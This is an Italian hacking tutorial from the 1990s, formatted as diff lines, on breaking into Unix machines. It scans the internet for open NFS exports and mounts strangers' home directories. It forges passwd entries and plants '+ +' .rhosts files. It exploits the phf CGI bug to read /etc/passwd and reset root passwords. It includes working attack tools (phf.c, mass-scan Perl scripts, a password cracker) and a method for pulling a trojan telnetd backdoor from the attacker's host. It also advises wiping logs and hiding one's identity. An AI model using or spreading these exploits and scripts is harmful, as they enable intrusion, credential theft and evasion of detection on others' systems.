+
+Ti serve un hacked account di root per iniziare. Per fare mount di un drive 
+remoto e accedervi devi modificare il passwd phile del sistema e usare il 
+comando su.
+
+Ok, diciamo che hai accesso di root. Iniziamo!
+
+Puoi vedere se ci sono drive mountable usando il comando showmount.
+
+Dall'account di Root:
+
+$root> showmount -e wwa.com
+mount clntudp_create: RPC: Port mapper failure - RPC: Unable to receive
+
+Ok ,no problem, questo domain non funziona, proviamo il prossimo
+
+$root> showmount -e seva.net
+Export list for seva.net:
+/var/mail                                        pluto.seva.net
+/home/user1                                      pluto.seva.net
+/usr/local                                       pluto.seva.net,rover.seva.net
+/export/X11R6.3                                  rover.seva.net
+/export/rover                                    rover.seva.net,pluto.seva.net
+/export/ftp/linux-archive/redhat-4.1/i386/RedHat (everyone)
+
+Nota la parola 'chiunque'(everyone), questo andrebbe bene se volessimo 
+installare linux da questo sistema, ma noi vogliamo aprire le directory degli 
+utenti,cosi' andiamo al prossimo...
+
+$root> showmount -e XXXXX.XXX < questo ha funzionato ... ora trovatelo ;)
+
+Export list for XXXXX.XXX:
+/export/home (everyone)
+
+Ora, questo tipo ha montato la sua home directory, gli account degli utenti si 
+trovano fuori dalla home ;) e guarda...(everyone) puo' accedervi!!! 
+
+Ok questa sezione serviva a mostrarti come vedere se sono mountable, nella 
+prossima vedremo come fare il mount e l'hack. Per ora ecco uno script che fara' 
+lo scan di TUTTI I DOMINI su internet cercando quelli montable e li logghera' per te.
+
+Per usarlo usa il 'domain dipper' nella sezione PHF e scarica i file che ti 
+servono da rs.internic.net Fai il rip di alcuni domini e chiama il file 
+'domains' e avvia lo script. Per farlo funzionare il background, metti 
+una & dopo il comando. cosi': 
+cmount.pl&
+
+Come funziona:
+
+Quando lanci il file esso andra' nella domain list e lancera' showmount -e su 
+ogni dominio, se trova dei driver mountable salvera' le info in un file 
+chiamato:
+domain.XXX.export. Devi soltanto editare il file e montare i drive!
+
+--------------- Inizio di cmount.pl
+#!/usr/bin/perl -w
+#
+# Check NFS exports of hosts listed in file.
+# (Hosts are listed, once per line with no additional whitespaces.)
+#
+# ii@dormroom.pyro.net - 2/27/97.
+
+# Assign null list to @URLs which will be added to later.
+my(@result) = ();
+my(@domains) = ();
+my($program) = "showmount -e ";
+
+# Pull off filename from commandline. If it isn't defined, then assign default.
+my($DomainFilename) = shift;
+$DomainFilename = "domains" if !defined($DomainFilename);
+
+# Do checking on input.
+die("mountDomains: $DomainFilename is a directory.\n") if (-d $DomainFilename);
+ 
+# Open $DomainFilename.
+open(DOMAINFILE, $DomainFilename) or 
+  die("mountDomains: Cannot open $DomainFilename for input.\n");
+  
+while (<DOMAINFILE>) {
+  chomp($_);
+  print "Now checking: $_";
+
+  # Note difference in program output capture from "geturl.pl".  
+  open (EXECFILE, "$program $_ |");
+  @execResult = <EXECFILE>;
+  next if (!defined($execResult[0]));
+  if ($execResult[0] =~ /^Export/) {
+    print " - Export list saved.";
+    open (OUTFILE, ">$_.export");
+    foreach (@execResult) {
+      print OUTFILE;
+    }
+    close (OUTFILE);
+  }
+  close(EXECFILE);
+  print "\n";
+}
+  
+# We are done. Close all files and end the program.
+close (DOMAINFILE);
+
+0;
+----------------- fine di cmount.pl
+
+Ok,ora si inizia a montare i drive ....
+
+Diciamo che abbiamo fatto showmount -e domain.com  e abbiamo ottenuto:
+
+Export list for domain.com:
+/   (everyone)
+/p1 (everyone)
+/p2 (everyone)
+/p3 (everyone)
+/p5 (everyone)
+/p6 (everyone)
+/p7 (everyone)
+/var/spool/mail titan,europa,galifrey
+/tmp            (everyone)
+
+Vogliamo montare / ...yup ....questo tipo ha l'intero sistema montabile!!!!
+
+$root> mkdir /tmp/mount
+$root> mount -nt nfs domain.com:/ /tmp/mount
+
+Se la Home directory e'mountable il comando sarebbe:
+
+$root> mount -nt nfs domain.com:/home /tmp/mount
+
+Per fare l'unmount del sistema,assicurati di essere fuori dalla directory e 
+digita:
+$root> umount /tmp/mount
+
+Assicurati di fare per prima cosa la directory di mount, puoi farlo ovunque nel 
+sistema che vuoi. Se la 
+directory /mnt dei sistemi e'vuota puoi usare anche quella.
+
+Ok. Questa volta e'per davvero:
+
+bash# ls -al /mnt  ; assicurati che la directory mnt sia vuota
+ls: /mnt: No such file or directory ; Non c'e'neanche la directory ;)
+bash# mkdir /mnt ; lets make one for them <g>rin
+bash# mount -nt nfs xxxxxx.xxx:/export/usr /mnt ;Iniziamo a fare mount
+bash# cd /mnt ; andiamo sul mounted drive...
+bash# ls ; il classico comando di dir
+TT_DB             home              raddb             share
+back              local             radius-961029.gz  www
+exec              lost+found        radius-961029.ps
+bash# ;
+bash# cd home
+bash# ls -l  ;  
+total 18
+drwxr-xr-x   2 judy     other         512 Feb  1 10:41 garry
+drwxr-xr-x  69 infobahn other        5632 Mar 10 01:42 horke
+drwxr-xr-x  11 301      other        2048 Mar  1 10:25 jens
+drwxr-xr-x   2 300      other         512 Oct 15 07:45 joerg
+drwxr-xr-x   2 604      other         512 Feb  8 13:00 mailadmin
+drwxr-xr-x   2 melissa  other         512 Sep 27 06:15 mk
+drwxr-xr-x   6 news     news          512 Mar  6  1996 news
+drwxr-xr-x   2 303      other         512 Jan 24 04:17 norbert
+drwxr-xr-x   4 jim      other         512 Sep 27 06:16 pauk
+drwxr-xr-x   2 302      other         512 Mar  1 10:10 tom
+drwxr-xr-x   5 601      daemon        512 Jan 26  1996 viewx
+drwxr-xr-x  10 15       audio         512 Oct 17 08:03 www
+bash# ; tom e'l'utente #302 
+bash# pico /etc/passwd ;mettiamolo nella nostra passwd list 
+tom:x:302:2::/home:/bin/bash ; 
+bash# su - tom ; facciamo su sull'account di tom ...
+bash$ ls -l
+total 18
+drwxr-xr-x   2 judy     other         512 Feb  1 10:41 garry
+drwxr-xr-x  69 infobahn other        5632 Mar 10 01:42 horke
+drwxr-xr-x  11 301      other        2048 Mar  1 10:25 jens
+drwxr-xr-x   2 300      other         512 Oct 15 07:45 joerg
+drwxr-xr-x   2 604      other         512 Feb  8 13:00 mailadmin
+drwxr-xr-x   2 melissa  other         512 Sep 27 06:15 mk
+drwxr-xr-x   6 news     news          512 Mar  6  1996 news
+drwxr-xr-x   2 303      other         512 Jan 24 04:17 norbert
+drwxr-xr-x   4 jim      other         512 Sep 27 06:16 pauk
+drwxr-xr-x   2 tom      other         512 Mar  1 10:10 tom
+drwxr-xr-x   5 601      daemon        512 Jan 26  1996 view
+drwxr-xr-x  10 15       audio         512 Oct 17 08:03 www
+bash$ ;Nota che l'user number di tom non c'e'piu': ora la dir e'nostra!
+bash$ echo + +>>tom/.rhosts  ; this will make a file in his dir called .rhosts
+bash$ ;inside .rhosts sara' wild cards + +  per far accedere chiunque con rlogin 
+bash$ rlogin xxxxx.xxx  Ora siamo tom sulla macchina  facciamo rlogin 
+Last login: Fri Mar  7 00:16:03 from xxxxx.xxxxxxxxxx
+Sun Microsystems Inc.   SunOS 5.5       Generic November 1995
+>  ; yup we are in!
+> ls -al
+total 8
+drwxr-xr-x   2 tom      group        512 Mar  1 17:10 .
+drwxr-xr-x  14 tom      group        512 Jan 24 11:16 ..
+-rw-r--r--   1 tom      group        144 Dec 30 15:32 .profile
+-rw-r--r--   1 tom      bin            8 Mar 11 08:26 .rhosts
+>
+
+Ok,ora abbiamo l'accesso,iniziamo l'hack al sistema ....ops ..questa e'un altra 
+lezione! 
+
+-------------------------
+Capitolo III
+Recuperare i passwd files
+-------------------------
+
+Ci sono alcuni modi per ottenere i file delle password da sistemi unix. Nella 
+maggior parte dei casi ti servira' un account, ma c'e'anche un modo per entrare 
+in un sistema senza avere un account. Qui imparerai la differenza tra un normale 
+file di password ed un file di password shadowed. Imparerai anche un modo di 
+leggere un file di password shadowed.
+
+------------------
+Sezione 3A
+PHF WWW PH Query
+------------------
+
+C'e'un programma nella directory WWW cgi-bin chiamato phf, se il file si trova 
+qui,e ha dei permessi di un certo tipo,puoi accederci usando www, o un browser 
+testuale presente in linux come lynx. Ora puoi leggere i file nel sistema (yup 
+.. /etc/passwd) e salvarli localmente sul tuo computer.
+
+Ci sono molte altre cose che si posssono fare ora. Se il server fa girare httpd 
+come root,possiamo essere root usando phf e possiamo anche cambiare la password 
+di un account sulla macchina.
+
+Includero' uno script in perl che fara' l'auto-check di tutti i sistemi usando 
+lo script getdomain.pl che si trova qui sotto e controllera' se il server sta 
+girando come root, in tal caso far' il log dell'id; altrimenti fara' 
+automaticamente il download del file di password dalla directory /etc e lo 
+chiamera' nomedominio.???.passwd.
+
+Fara' anche l'attach di uno script che permettera' di usare un semplice comando 
+da una shell e se il phf e'sul sistema ti permettera' di accodare i comandi 
+dalla shell al sistema remoto con una sola riga di comando.
+
+Ok,ora impariamo ad usare il phf.
+
+Usa il tuo Web browser preferito,sia esso un browser grafico o testuale come ad 
+esempio lynx,presente sulla maggior parte dei sistemi unix.
+
+Dopo che e'apparsa la schermata,premi il tasto g, ora appare una riga come 
+questa:
+
+URL to open:
+  Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
+  H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
+
+Digita:
+
+URL to open: http://xxx.org/cgi-bin/phf/?Qalias=x%0aid
+  Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
+  H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
+
+Apparira':
+
+                                 QUERY RESULTS
+
+   /usr/local/bin/ph -m alias=x id
+
+uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)
+
+Cosi' vediamo che sta girando come utente (nobody), cosi',nel sistema, ora 
+possiamo essere un utente chiamato nobody. Non siamo root,ma e'quello che 
+dobbiamo ottenere ;)
+
+Nota la riga di comando:
+
+http://afp.org/cgi-bin/phf/?Qalias=x%0aid
+
+L'ID era il comando al server per darci l'ID del'utente. Qualche volta dovrai 
+dare l'intero path del file che vuoi lanciare, in questo caso avrebbe dovuto 
+essere: 
+http://afp.org/cgi-bin/phf/?Qalias=x%0a/usr/bin/id
+
+Nota che dopo %0a inizia la riga di comando. Se vuoi inserire uno spazio dovrai 
+scrivere %20 invece dello spazio. Queste sono delle linee di comando di esempio. 
+Le iniziero' con %0a
+
+Fa il cat del passwd file
+%0a/bin/cat%20/etc/passwd
+
+Ottieni una long directory nella directory /etc di tutti i file che iniziano con 
+pass
+%0als%20-al%20/etc/pass*
+
+Fa il backup del password file se hai accesso di root con httpd a passwd.my
+%0acp%20/etc/passwd%20/etc/passwd.my
+
+Cambia la password di root (se il server te lo permette (e di solito lo fa))
+%0apasswd%20root
+
+(la riga qui sopra dovrebbe permettere di fare login senza password,ricorda di 
+copiare sempre il passwd.my sopra al file gia' presente, e quindi cancellare 
+sempre il backup,poi creati una suid shell bash da qualche parte e 
+rinominala,fai sniffing per trovare le tue password).
+
+Se sai come digitare i comandi unix e non ti dimentichi di usare %20 al posto 
+degli spazi ,non avrai nessun problema!
+
+Ok, recuperiamo il file di passwd su questo sistema ;)
+
+Url da aprire: http://xxx.org/cgibin/phf/?Qalias=x%0acat%20/etc/passwd
+
+Otteniamo:
+
+                                 QUERY RESULTS
+
+
+   /usr/local/bin/ph -m alias=x cat /etc/passwd
+
+root:R0rmc6lxVwi5I:0:0:root:/root:/bin/bash
+bin:*:1:1:bin:/bin:
+daemon:*:2:2:daemon:/sbin:
+adm:*:3:4:adm:/var/adm:
+lp:*:4:7:lp:/var/spool/lpd:
+sync:*:5:0:sync:/sbin:/bin/sync
+shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
+halt:*:7:0:halt:/sbin:/sbin/halt
+mail:*:8:12:mail:/var/spool/mail:
+news:*:9:13:news:/usr/lib/news:
+uucp:*:10:14:uucp:/var/spool/uucppublic:
+operator:*:11:0:operator:/root:/bin/bash
+games:*:12:100:games:/usr/games:
+man:*:13:15:man:/usr/man:
+postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
+nobody:*:-2:100:nobody:/dev/null:
+ftp:*:404:1::/home/ftp:/bin/bash
+guest:*:405:100:guest:/dev/null:/dev/null
+bhilton:LkjLiWy08xIWY:501:100:Bob Hilton:/home/bhilton:/bin/bash
+web:Kn0d4HJPfRSoM:502:100:Web Master:/home/web:/bin/bash
+mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash
+
+Un piccolo file di passwd! Arghhhhh!!! 
+
+Se vuoi salvare questo in un file nella tua directory locale usa l'opzione 
+<p>rint nel browser testuale e potrai ora salvare il file nella vostra Home.
+
+Impariamo qualcosa ora:
+
+mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash
+1   :2            :3  :4  :5             :6         :7
+
+1=username 2=password criptata 3=numero dell'utente 4=group id 5=realname
+6=home directory 7=shell
+
+Ok, diciamo di non voler usare un browser Web, questo e'uno script che puoi 
+compilare per poter usare normali comandi dalla shell
+
+phf.c
+------ cut here----
+
+/* Some small changes for efficiency by snocrash. */
+/*
+ * cgi-bin phf exploit by loxsmith [xf]
+ *
+ * I wrote this in C because not every system is going to have lynx.  Also,
+ * this saves the time it usually takes to remember the syntatical format
+ * of the exploit.  Because of the host lookup mess, this will take
+ * approximately 12 seconds to execute with average network load.  Be patient.
+ *
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <errno.h>
+
+int main(argc, argv)
+     int argc;
+     char **argv;
+{
+     int i = 0, s, port, bytes = 128;
+     char exploit[0xff], buffer[128], hostname[256], *command, j[2];
+     struct sockaddr_in sin;
+     struct hostent *he;
+
+     if (argc != 3 && argc != 4) {
+          fprintf(stderr, "Usage: %s command hostname [port]", argv[0]);
+          exit(1);
+     }
+
+     command = (char *)malloc(strlen(argv[1]) * 2);
+
+     while (argv[1][i] != '\0') {
+          if (argv[1][i] == 32) strcat(command, "%20"); else {
+               sprintf(j, "%c", argv[1][i]);
+               strcat(command, j);
+          }
+          ++i;
+     }
+
+     strcpy(hostname, argv[2]);
+     if (argc == 4) port = atoi(argv[3]); else port = 80;
+
+     if (sin.sin_addr.s_addr = inet_addr(hostname) == -1) {
+          he = gethostbyname(hostname);
+	  if (he) {
+               sin.sin_family = he->h_addrtype;
+               memcpy((caddr_t) &sin.sin_addr, he->h_addr_list[0], 
+                      he->h_length);
+          } else {
+               fprintf(stderr, "%s: unknown host %s\n", argv[0], hostname);
+               exit(1);
+          }
+     }
+     sin.sin_family = AF_INET;
+     sin.sin_port = htons((u_short) port);
+
+     if ((s = socket(sin.sin_family, SOCK_STREAM, 0)) < 0) {
+          fprintf(stderr, "%s: could not get socket\n", argv[0]);
+          exit(1);
+     }
+
+     if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+          close(s);
+          fprintf(stderr, "%s: could not establish connection\n", argv[0]);
+          exit(1);
+     }
+
+     sprintf(exploit, "GET /cgi-bin/phf/?Qalias=X%%0a%s\n", command);
+     free(command);
+     write(s, exploit, strlen(exploit));
+     while(bytes == 128) {
+          bytes = read(s, buffer, 128);
+          fprintf(stdout, buffer);
+     }
+     close(s);
+}
+
+-------- cut here
+
+
+Ecco come si puo' usare:
+
+bash% phf id xxx.org
+
+------
+<H1>Query Results</H1>
+<P>
+/usr/local/bin/ph -m  alias=X
+id
+<PRE>
+uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)
+</GET /cgi-bin/phf/?Qalias=X%0aid
+------
+
+Qui sopra si trova la risposta,ricorda di usare i codici% dopo i comandi
+Per recuperare i file di passwd con questo programma devi scrivere:
+
+phf cat%20/etc/passwd hostname.xxx
+
+Un altro modo e'di usare phf scritto da Quantumg sulla sua pagina web.
+
+Questo e'il testo:
+
+New QG Phf Attack MO
+--------------------
+
+Ok, so che e'da tanto tempo che si considera phf come una buona strada per 
+attaccare ma sarai sorpreso da quanti stupidi operatori linux si trovano la 
+fuori...
+
+prima un po' di spiegazione.
+
+Phf e'un eseguibile cgi-bin che si trova sui web server apache. E Exploitable e 
+come risultato puoi eseguire comandi sul web server con il medesimo id di httpd, 
+di solito nobody ma qualche volta root. Per fare l'Exploit basta connettersi al 
+server e fornire questa query:
+
+GET /cgi-bin/phf/?Qalias=X%0a
+
+seguita dal comando che vuoi eseguire con %20 al posto degli spazi. Non puoi 
+fare piping di comandi,quoting, cambio di shell,etc.
+
+Ok.. continuamo l'attacco. Quello che stiamo per fare e'cercare un sistema linux 
+(di solito faccio telnet al sistema per fare la verifica) che abbia il bug phf. 
+Io,come un gran numero di altre persone,uso il programma phf loxsmith per fare 
+exploit al bug phf. Tutto cio' che fa e'connettersi all'host specificato in 
+argv[2]  e fa il dump della query con argv[1] come comando. Si usa in questo 
+modo:
+
+phf id www.host.to.hack
+
+dove id e'il comando che vuoi eseguire. Questa e'la prima cosa che farei.
+Non solo mi dice se il sistema e'exploitable ma anche soot chi sta girando 
+httpd. Cosi' assumendo di ricevere una buona risposta, abbiamo una macchina su 
+cui fare hack. Il primo problema e trovare dello stuff sul box da eseguire. Non 
+e'un grosso problema. Puoi: 1) controllare le directory scrivibili con ftp o 2) 
+usare rcp. Per usare rcp devi sistemare un po' di cose sulla tua macchina, o 
+meglio su di una macchina precedentemente espugnata. La prima di queste cose 
+e'un account da usare per il trasferimento. Trova qualcosa di semplice 
+come,ad esempio,lo user name 'test' Poi devi inserire il nome dell'host su cui 
+fare hacking (www.host.to.hack) nel tuo /etc/hosts.equiv. Poi ti devi assicurare 
+di avere una riga di 'shell' nel tuo /etc/inetd.conf e di resettare inetd in 
+modo da leggere la riga. Infine devi creare un file rhosts nella home di 'test' 
+che ha il nome dell'host che stai crackando seguito dall'username sotto cui sta 
+girando httpd.
+
+/etc/hosts.equiv:
+www.host.to.hack
+
+/etc/inetd.conf:
+shell   stream  tcp     nowait  root    /usr/sbin/tcpd  in.rshd -L
+
+~test/.rhosts:
+www.host.to.hack nobody
+
+Di solito trasferivo piccoli hacks modificati in modo da lavorare mentre sono 
+eseguiti da phf. Non era una cosa piacevole o efficiente. ora esiste anche la 
+possibilita' di usare un in.telnetd modificato in modo da partire in 'debug 
+mode'che usa la porta 9999 ed esegue /bin/sh al posto di /bin/login. Prima di 
+eseguire la shell si biforca in modo da usare la porta 9999 e accettare quante 
+connessioni si desideri.
+
+Cosi' per ottenere cio' sull'host remoto,quello che si deve fare e'di metterlo 
+nella homedir di 'test' (assicurati che sia leggibile) e digita:
+
+ 	phf 'rcp test@my.ip.address:bindwarez /tmp' www.host.to.hack
+
+Nei log locali troverai un tentativo di connessione a in.rshd e il comando che 
+esegue (di solito 'rcp -f bindwarez') .. dopo che phf ha finito bindwares sara' 
+nella /tmp della macchina remota. Ora si puo' fare telnet alla porta 9999.
+
+Se il web site e'abbastanza stupido da far girare httpd come root ti vorrai 
+proteggerlo installanod il trojan in.telnetd e cancellando i logs. Comunque di 
+solito avrai solo una shell 'nobody'  e dovrai ottenere l'accesso di root in 
+altri modi. Di solito non e'un problema fare questo perche'l'admin considera' 
+garantito che nessuno avra' una shell nel loro sistema WWW e cosi' non ci sara' 
+bisogno di proteggerlo. Cosa che ovviamente non sa fare cosi' bene visto che ha 
+ancora un phf exploitable.
+
+Non finiro' mai di dire quanto e'importante cancellare i logs. Il tuo indirizzo, 
+quello nel comando rcp che hai inviato e'li' in bella mostra per l'admin.
+Non dovranno nemmeno cercarlo.Questi log sono di solito in 
+/usr/local/etc/httpd/logs e qualche volta in /var/lib/httpd/logs. 
+Il modo migliore di trovarlo e di cercare li' e in caso negativo scrivere: 
+find / -name cgi-bin. 
+Questo fara' al caso tuo. Non dimenticarti di killare i processi bindwarez e 
+di cancellare /tmp/bindwarez.
+
+Questo e'un buon attacco che risolve molti problemi che rendono phf cosi' lungo 
+e pesante.
+
+L8s
+
+QuantumG
+
+Un altro modo di usare phf sarebbe di usare lo script perl che si trova piu' in 
+alto chiamato getdomain.pl per estrarre i nomi degli host dai domain files su 
+rs.internic.net, dopo di che puoi testare ciascun domain sulla rete usando 
+geturl.pl.
+
+Ecco lo script:
+
+geturl.pl
+--------- cut here
+
+#!/usr/bin/perl -w
+#
+# geturl by Nfin8 / Invisible Evil
+# Questions to: /msg i-e  or  /msg i^e
+#
+# Format of http://website.dom/cgi-bin/phf?Qalias=x%0a/usr/bin/id
+# Format of http://website.dom/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+# IF result of first command returns an "id=" then check for user. If user
+# is not root then execute the 2nd form.
+
+# Assign null list to @URLs which will be added to later.
+my(@URLs)=();
+my($program) = "lynx -dump";
+
+# Pull off filename from commandline. If it isn't defined, then assign default.
+my($URLfilename) = shift;
+$URLfilename = "urls" if !defined($URLfilename);
+
+# Do checking on input.
+die("GetURL: $URLfilename is a directory.\n") if (-d $URLfilename);
+ 
+# Open and read contents of URL file into @URL by line.
+open(FILE, $URLfilename) or die("GetURL: Cannot open $URLfilename for 
+input.\n");
+@URLs = <FILE>;
+close(FILE);
+
+# Open output file.
+open(OUTFILE, ">>GetURLResults") or die("GetURL: Cannot open output file.\n");
+
+my($url)="";
+foreach $url (@URLs) {
+  print ("Now checking: $url");
+  chomp($url);
+  $result = `$program http://${url}/cgi-bin/phf?Qalias=x%0a/usr/bin/id`;
+  print OUTFILE ("\n============ $url ============\n");
+  foreach (split(/\n/, $result)) {
+    print OUTFILE ("$_\n");
+  }
+  if ($result =~ m/id=/i) {
+    if ($result =~ m/root/i) {
+      print ("Logging root response.\n");
+    } else {
+      print ("Got ID response, getting /etc/passwd...");
+      $result = `$program http://${url}/cgi-
+bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`;
+      
+      # Output results to file named <domain>.passwd;
+      local($domainfilename)="";
+      $domainfilename = $url;
+      if (open(PASSWDFILE, ">${domainfilename}.passwd")) {
+        print PASSWDFILE ("\n");
+        foreach (split(/\n/, $result)) {
+          print PASSWDFILE ("$_\n");
+        }
+        close(PASSWDFILE);
+        print ("Done! [$domainfilename].\n");
+      } else {
+        print ("FAILED! [$domainfilename].\n");
+      }
+    }
+  }
+}
+  
+# We are done. Close the output file and end the program.
+close (OUTFILE);
+
+
+0;
+ 
+------------- cut here
+
+Ok,questo e'facile,basta digitare geturl.pl dopo chmod +x sul file.
+
+Questa e'la mia documentazione per il file:
+
+Questo utile tool e'facile da usare e con esso otterrai alcuni accessi di root e 
+molte password da vari domain.
+
+geturl.pl provera' e fara' il log dei risultati per ciascun domain sul web. Tu 
+scegli il tipo: .COM .EDU 
+.ORG .MIL .GOV  (o) puoi inserire una lista di indirizzi IP da controllare. Se 
+trova un accesso di root fara' il log e procedera' col successivo. Se phf Probe 
+trova accessi non di root recuperera' per te il file di password e lo salvera' 
+nella attuale directory nel formato (domainname.???.passwd) 
+
+Questa e'una breve documentazione . Per qualunque domanda /msg i-e o i^e
+
+fai ftp a ftp.rs.internic.net
+
+nella directory di domain troverai: 
+
+com.zone.gz
+edu.zone.gz
+gov.zone.gz
+mil.zone.gz
+net.zone.gz
+org.zone.gz
+
+scarica questi file e lancia getdomain.pl sui domain da controllare per primi:
+perl getdomain.pl com.zone com >com.all
+
+Questo fara' il controllo di tutti i domini .COM e creera' il file com.all in 
+cui mettera' i risultati della ricerca.
+
+Per fare la stessa cosa con i domini .EDU:
+perl getdomain.pl edu.zone edu >edu.all
+
+Cosi' avremo una lista da usare con geturl.pl chiamata edu.all
+
+Per usarla digita:
+
+geturl.pl <filename>
+
+filename=edu.all or com.all  e non mettere le <>
+
+I riultati saranno loggati in un file chiamato GetURLResults nella attuale 
+directory.
+
+1) geturl.pl usera' LYNX (verifica che sia nel tuo path)
+
+2) se geturl trova accesso di root ad httpd in un url fara' il log di quel 
+dominio nel result file. Se geturl non trova accesso di root ma riesce ad 
+accedere al dominio con phf, scarichera' il file di password nella 
+directory attuale, con il nome nomecompletodeldominio.passwd
+
+3) Se vuoi puoi ottenere una lista di indirizzi IP nel feed file.
+
+4) Io uso os/2 e ho fatto il porting in hpfs di lynx e perl e cosi' non ho 
+problemi con i nomi lunghi dei file. L'ho testato con unix ed e'tutto ok, cois' 
+non ci dovrebbero essere problemi usando questo sistema in una shell unix.
+
+Cosa ti serve:
+
+1. Perl nel path
+2. Lynx nel path
+3. Filenames di 256 caratteri (unix o 0s/2 hpfs)
+4. i files inclusi qui
+5. I domain files inclusi nell'ftp di internic oppure una lista personale di 
+urls o ip address e chiama il file 'urls' poi digita:  geturl.pl
+
+Attenzione:
+
+Sarebbe meglio se tu avessi pagato in contanti per il tuo account Internet 
+usando un altro nome oppure possiamo usare un hacked account per ottenere tutti 
+i results per poi utilizzare un altro account sicuro per iniziare a lavorare. Ma 
+non serve che te lo dica vero? Non devo biasimare me stesso per questi file, 
+essi vengono forniti per controllare la sicurezza dei domini. ;)
+
+getdomain.pl: to rip .ORG .COM .EDU .MIL .GOV Internic domain files
+geturl.pl: to check and log the results of each domain
+GetURLResults: The file that geturl makes as its log file
+
+Ecco un altra 'dritta':
+
+Se puoi leggere il file /var/adm/messages puoi trovare alcune password di utenti 
+e persino delle password di ROOT!
+
+Quante volte hai avuto fretta di fare login?  Digiti la password al posto della 
+login. Questo e'facile in una di quelle giornate in cui nulla sembra che vada 
+bene. Hai sbagliato 2 volte la login,il sistema gira lento, e cosi'...succede!
+
+Login: premi invio
+Password: pensi che voglia la login e cosi' scrivi il tuo nome
+Login: digiti la tua password
+
+Nel message file appare cosi':
+
+login: latuapassword
+password ******* Non te l'hanno data, dovresti avere solo il login name, ma 
+oops, hai digitato la tua password,e se possiamo leggere il message file,abbiamo 
+una buona password da mettere in crackerjack. 
+
+Ecco uno script per facilitare le cose!
+
+PER IL FILE BINDWAREZ BY QUANTUM: lo troverai alla file del testo nell'appendice 
+FILE UUENCODATI.
+
+------------ cut here
+
+#!/bin/sh
+# Under a lot of linux distributions(I know Redhat 3.0.3 and Slackware 3.0)
+# /var/log/messages is world readable. If a user types in his password at
+# the login prompt, it may get logged to /var/log/messages.
+#
+# I could swear this topic has been beaten to death, but I still see this
+# problem on every linux box I have access to.
+#
+# Dave G.
+# 12/06/96
+# <daveg@escape.com>
+# http://www.escape.com/~daveg
+
+echo Creating Dictionary from /var/log/messages, stored in /tmp/messages.dict.$$
+
+grep "LOGIN FAILURE" /var/log/messages | cut -d',' -f2 | cut -c2- | sort | uniq 
+>> /tmp/messages.dict.$$
+
+if [ ! -e ./scrack ]
+then
+   echo "Creating scrack.c"
+   cat << ! > scrack.c
+#include <stdio.h>
+#include <unistd.h>
+#include <pwd.h>
+#include <sys/types.h>
+#define get_salt( d, s ) strncpy( d, s, 2 )
+void
+main(argc,argv)
+int argc;
+char **argv;
+{
+   struct passwd *pwd;
+   FILE *fp;
+   char buff[80], salt[3], *encrypted_string;
+
+   if ( ( fp = fopen( argv[1], "r" ) ) == NULL )
+   {
+      fprintf( stderr, "Couldnt find dict file\n" );
+      exit(1);
+   }
+   while ( fgets( buff, 80, fp ) != NULL )
+   {
+      setpwent();
+      buff[strlen(buff)-1]='\0';
+      while ( ( pwd = getpwent() ) != NULL )
+      {
+        if ( strcmp( (*pwd).pw_passwd, "*" ) != 0 &&
+           ( strlen( (*pwd).pw_passwd ) == 13 ) )
+        {
+           get_salt(salt, (*pwd).pw_passwd );
+
+           encrypted_string = crypt( buff, salt );
+           if ( strcmp( encrypted_string, (*pwd).pw_passwd ) == 0 )
+           {
+             fprintf( stdout, "l: %s p: %s\n", (*pwd).pw_name, buff);
+             fflush(stdout);
+           }
+         }
+      }
+   }
+}
+!
+   echo "Creating scrack"
+   cc -O6 -fomit-frame-pointer -s -o scrack scrack.c
+fi
+
+./scrack /tmp/messages.dict.$$
+
+echo /tmp/messages.dict.$$, ./scrack, and ./scrack.c still exist, delete them 
+yourself.
+
+------ cut here
+
+-----------------------
+Sezione 3B
+Novellini
+-----------------------
+Ancora un altro posto dove trovare passwd files. Basta seguire le istruzioni 
+nella sezione 2B. 
+
+------------------------------
+Sezione 3C
+Ottenere i shadow passwd files
+------------------------------
+
+Cos'e'un shadow passwd file?
+
+Usiamo il passwd file qui sotto per mostrare come apparirebbe se lo editassi:
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/adm:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+man:x:13:15:man:/usr/man:
+postmaster:x:14:12:postmaster:/var/spool/mail:/bin/bash
+nobody:x:-2:100:nobody:/dev/null:
+ftp:x:404:1::/home/ftp:/bin/bash
+guest:x:405:100:guest:/dev/null:/dev/null
+bhilton:x:501:100:Bob Hilton:/home/bhilton:/bin/bash
+web:x:502:100:Web Master:/home/web:/bin/bash
+mary:x:503:100:Mary C. Hilton:/home/mary:/bin/bash
+
+Manca qualcosa? Yup, le password criptate. Se ottieni accesso di root le 
+password criptate sono in /etc/shadow. Alcuni Admin nasconderanno il shadow file 
+in qualche directory da qualche parte, ma perlopiu' lo troverai in /etc. Altri 
+shadow programs lo potranno mettere nel file master.passwd. Ma se ottieni il 
+root access, dai una occhiata in giro.
+
+Diciamo che hai un accesso alla macchina ma non riesci ad accedere a root.
+Non e'un problema se stanno usando libc 5.4.7, e in questo mometo molti lo 
+fanno! Almeno uno di questi file ha permessi di suid :
+
+ping, traceroute, rlogin, oppure, ssh
+
+1. Digita bash o sh per lanciare una shell
+2. Digita export RESOLV_HOST_CONF=/etc/shadow
